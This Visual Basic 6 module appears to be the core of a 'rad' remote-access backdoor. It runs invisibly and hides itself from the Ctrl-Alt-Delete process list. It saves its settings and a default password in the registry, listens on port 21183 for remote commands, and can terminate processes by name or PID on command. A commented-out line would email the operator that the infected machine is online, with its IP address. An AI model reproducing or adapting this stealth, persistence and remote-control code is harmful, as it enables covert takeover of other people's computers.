Attribute VB_Name = "mainModule"
Public Const TH32CS_SNAPPROCESS As Long = 2&
Public Const MAX_PATH As Integer = 260


Public Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * MAX_PATH
    End Type



Public Declare Function CreateToolhelpSnapshot Lib "Kernel32" Alias "CreateToolhelp32Snapshot" _
    (ByVal lFlags As Long, ByVal lProcessID As Long) As Long


Public Declare Function ProcessFirst Lib "Kernel32" Alias "Process32First" _
    (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long


Public Declare Function ProcessNext Lib "Kernel32" Alias "Process32Next" _
    (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long


Public Declare Sub CloseHandle Lib "Kernel32" _
    (ByVal hPass As Long)


Declare Function TerminateProcess Lib "Kernel32" (ByVal ApphProcess As Long, ByVal uExitCode As Long) As Long


Declare Function OpenProcess Lib "Kernel32" (ByVal dwDesiredAccess As Long, ByVal blnheritHandle As Long, ByVal dwAppProcessId As Long) As Long

'.............process shit

Public Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Public Declare Function GetCurrentProcessId Lib "Kernel32" () As Long


Public Declare Function RegisterServiceProcess Lib "Kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
    Public Const RSP_SIMPLE_SERVICE = 1
    Public Const RSP_UNREGISTER_SERVICE = 0


Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Public Const SWP_HIDEWINDOW = &H80
    Public Const SWP_SHOWWINDOW = &H40


Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long


Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long


Public Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)



Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" _
    (ByVal lpBuffer As String, nSize As Long) As Long


'email stuff
Public Response As String, Reply As Integer, DateNow As String
Public first As String, Second As String, Third As String
Public Fourth As String, Fifth As String, Sixth As String
Public Seventh As String, Eighth As String
Public Start As Single, Tmr As Single
'end email stuff

Public userEMail As String
Public newport As Integer
Public spawnNew As Boolean
Public serverMessage As String
Public userVar(1 To 20) As String
Public Authenticated As Boolean
Public comBuffer As String
Public comCurrent As String
Public comFull As String
Public comChar As String * 1
Public lastCommand
Public argCount As Integer
Public appPath As String
Public serverName As String
Public serverPass As String
Public listenPort As Integer

Function CurUserName() As String
    Dim S1 As String: S1 = Space(512)
    GetUserName S1, Len(S1)
    CurUserName = Trim$(S1)
End Function

Sub WaitFor(WaitFor As Single)
On Error Resume Next
oldTime = Timer
Do While (Timer - oldTime) < WaitFor: DoEvents: Loop
End Sub

Sub LogEvent(Evnt)
frmMain.lstSettings.AddItem Evnt
DoEvents
End Sub

Function Parse(ByVal parseStringx, ByVal argNum As Integer) As Variant
On Error Resume Next
Dim lastPos As Integer
Dim subPos As Integer
Dim argPos(1 To 50) As Integer
Dim argContent(1 To 50)
parseString = parseStringx
parseString = Trim(Right(parseString, ((Len(parseString)) - (InStr(parseString, " ")))))

parseString = parseString & " " 'save my ass some work



'count arguments
argCount = 0
Do
    DoEvents
    lastPos = InStr((lastPos + 1), parseString, " ")
    If lastPos = 0 Then Exit Do
    argCount = argCount + 1
    argPos(argCount) = lastPos
Loop
If argCount = 0 Then Exit Function
'end count arguments

'get argument content
For i = 1 To argCount
    Select Case i
        Case argCount
            If argCount <> 1 Then
                subPos = argPos(i - 1)
            Else
                subPos = 1
            End If
        Case 1
            subPos = 1
        Case Else
            subPos = argPos(i - 1)
    End Select
    DoEvents
    argContent(i) = Trim(Mid(parseString, subPos, (argPos(i) - subPos)))
Next i
'end get argument content

Parse = argContent(argNum)
End Function

Sub Pop(Optional popData As Variant)
On Error Resume Next
frmMain.Winsock.SendData popData & Chr(13) & Chr(10)
DoEvents
End Sub

Sub loadAll()
On Error Resume Next
If App.PrevInstance Then WaitFor (45) 'only one instance
If App.PrevInstance Then End
If Trim(LCase(Command)) = "show" Then
    frmMain.Visible = True
    frmMain.Show
    DoEvents
End If

frmMain.lstSettings.Clear
Do While frmMain.Winsock.State <> sckClosed
    DoEvents
    frmMain.Winsock.Close
Loop
LogEvent "-force close"

'write settings to registry
SaveSetting "rad", "settings", "path", App.Path & "\" & App.EXEName & ".exe"
LogEvent "-saved path"
'end write settings to registry

'read settings from registry
appPath = GetSetting("rad", "settings", "path")
LogEvent "path: " & appPath
listenPort = GetSetting("rad", "settings", "port", newport)
If listenPort = 0 Then listenPort = 21183
LogEvent "port: " & listenPort
serverName = GetSetting("rad", "settings", "name", "rad server(default)")
LogEvent "name: " & serverName
serverPass = GetSetting("rad", "settings", "password", "default")
LogEvent "pass: " & serverPass
serverMessage = GetSetting("rad", "settings", "message", "no login message")
LogEvent "-read server message"
comChar = GetSetting("rad", "settings", "command", "}")
LogEvent "-read command character(" & comChar & ")"
'userEMail = GetSetting("rad", "settings", "email", Trim(frmMain.lblEmail.Caption))
'LogEvent "-read email"
For i = 1 To 20
    DoEvents
    userVar(i) = GetSetting("rad", "settings", "uservar" & i)
Next i
LogEvent "-read user variables"
'end read settings from registry

frmMain.Winsock.LocalPort = listenPort

Do Until frmMain.Winsock.State = sckListening 'force listen
    frmMain.Winsock.Listen
    DoEvents
Loop
LogEvent "-force listen"
'LogEvent "-notify"
'SendEmail "mail.custommicrosystems.com", CurUserName, "rad" & CurUserName & "@radder.com", "Rad Owner", userEMail, "radder online", "radder online! @ " & Now & " - " & frmMain.Winsock.LocalIP
LogEvent "..."
DoEvents
End Sub

Function argArray(ByVal startPos As Integer, endPos As Integer) As String
Dim x As String
Parse comFull, 1
For i = startPos To endPos
    DoEvents
    x = x & Parse(comFull, i) & " "
Next i
argArray = Trim(x)
End Function

Public Sub Hide_Program_In_CTRL_ALT_Delete()
    Dim pid As Long
    Dim reserv As Long
    pid = GetCurrentProcessId()
    regserv = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
End Sub

Public Function WinDir(Optional ByVal AddSlash As Boolean = False) As String


    Dim t As String * 255
    Dim i As Long
    i = GetWindowsDirectory(t, Len(t))
    WinDir = Left(t, i)


    If (AddSlash = True) And (Right(WinDir, 1) <> "\") Then
        WinDir = WinDir & "\"
    ElseIf (AddSlash = False) And (Right(WinDir, 1) = "\") Then
        WinDir = Left(WinDir, Len(WinDir) - 1)
    End If

End Function

Public Function KillAppByExe(myName As String) As Boolean
    
    Const PROCESS_ALL_ACCESS = 0
    Dim uProcess As PROCESSENTRY32
    Dim rProcessFound As Long
    Dim hSnapShot As Long
    Dim szExename As String
    Dim exitCode As Long
    Dim myProcess As Long
    Dim appKill As Boolean
    Dim appCount As Integer
    Dim i As Integer
    On Local Error GoTo Finish
    appCount = 0
    
    Const TH32CS_SNAPPROCESS As Long = 2&
    
    uProcess.dwSize = Len(uProcess)
    hSnapShot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
    rProcessFound = ProcessFirst(hSnapShot, uProcess)
    Do While rProcessFound
        i = InStr(1, uProcess.szExeFile, Chr(0))
        szExename = LCase$(Left$(uProcess.szExeFile, i - 1))
        If Right$(szExename, Len(myName)) = LCase$(myName) Then
            KillApp = True
            appCount = appCount + 1
            myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, uProcess.th32ProcessID)
            appKill = TerminateProcess(myProcess, exitCode)
            Call CloseHandle(myProcess)
        End If


        rProcessFound = ProcessNext(hSnapShot, uProcess)
    Loop


    Call CloseHandle(hSnapShot)
Finish:
Pop "uProcSzExe:" & appKill
End Function

Public Function KillAppByPid(myPid As Long) As Boolean
Dim exitCode As Long
Dim appKill As Boolean

exitCode = Val(CLng(Parse(comFull, 3)))

    appKill = TerminateProcess(myPid, exitCode)

Finish:
Pop "uProcPid:" & appKill
End Function

Public Sub SendEmail(MailServerName As String, FromName As String, FromEmailAddress As String, ToName As String, ToEmailAddress As String, EmailSubject As String, EmailBodyOfMessage As String)


    
    Winsock1.LocalPort = 0 ' Must set local port to 0 (Zero) or you can only send 1 e-mail per program start
    


    If frmMain.winsockMail.State = sckClosed Then ' Check to see if socet is closed
        DateNow = Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss") & "" & " -0600"
        first = "mail from:" + Chr(32) + FromEmailAddress + vbCrLf ' Get who's sending E-Mail address
        Second = "rcpt to:" + Chr(32) + ToEmailAddress + vbCrLf ' Get who mail is going to
        Third = "Date:" + Chr(32) + DateNow + vbCrLf ' Date when being sent
        Fourth = "From:" + Chr(32) + FromName + vbCrLf ' Who's Sending
        Fifth = "To:" + Chr(32) + ToNametxt + vbCrLf ' Who it going to
        Sixth = "Subject:" + Chr(32) + EmailSubject + vbCrLf ' Subject of E-Mail
        Seventh = EmailBodyOfMessage + vbCrLf ' E-mail message body
        Ninth = "X-Mailer: EBT Reporter v 2.x" + vbCrLf ' What program sent the e-mail, customize this
        Eighth = Fourth + Third + Ninth + Fifth + Sixth ' Combine For proper SMTP sending
        frmMain.winsockMail.Protocol = sckTCPProtocol ' Set protocol For sending
        frmMain.winsockMail.RemoteHost = MailServerName ' Set the server address
        frmMain.winsockMail.RemotePort = 25 ' Set the SMTP Port
        frmMain.winsockMail.Connect ' Start connection
        
        WaitForm ("220")
               
        
        frmMain.winsockMail.SendData ("HELO yourdomain.com" + vbCrLf)
        WaitForm ("250")
        
        frmMain.winsockMail.SendData (first)
        
        WaitForm ("250")
        frmMain.winsockMail.SendData (Second)
        WaitForm ("250")
        frmMain.winsockMail.SendData ("data" + vbCrLf)
        
        WaitForm ("354")
        frmMain.winsockMail.SendData (Eighth + vbCrLf)
        frmMain.winsockMail.SendData (Seventh + vbCrLf)
        frmMain.winsockMail.SendData ("." + vbCrLf)
        WaitForm ("250")
        frmMain.winsockMail.SendData ("quit" + vbCrLf)
        
        
        WaitForm ("221")
        frmMain.winsockMail.Close
    End If

    
End Sub



Public Sub WaitForm(ResponseCode As String)

    Start = Timer ' Time Event so won't Get stuck in Loop


    While Len(Response) = 0
        Tmr = Start - Timer


        DoEvents ' Let System keep checking For incoming response **IMPORTANT**


            If Tmr > 50 Then ' Time in seconds to wait
                MsgBox "SMTP service error, timed out While waiting For response", 64, MsgTitle
                Exit Sub
            End If

        Wend



        While Left(Response, 3) <> ResponseCode


            DoEvents


                If Tmr > 50 Then
                    MsgBox "SMTP service error, impromper response code. Code should have been: " + ResponseCode + " Code recieved: " + Response, 64, MsgTitle
                    Exit Sub
                End If

            Wend

            Response = "" ' Sent response code to blank **IMPORTANT**
        End Sub
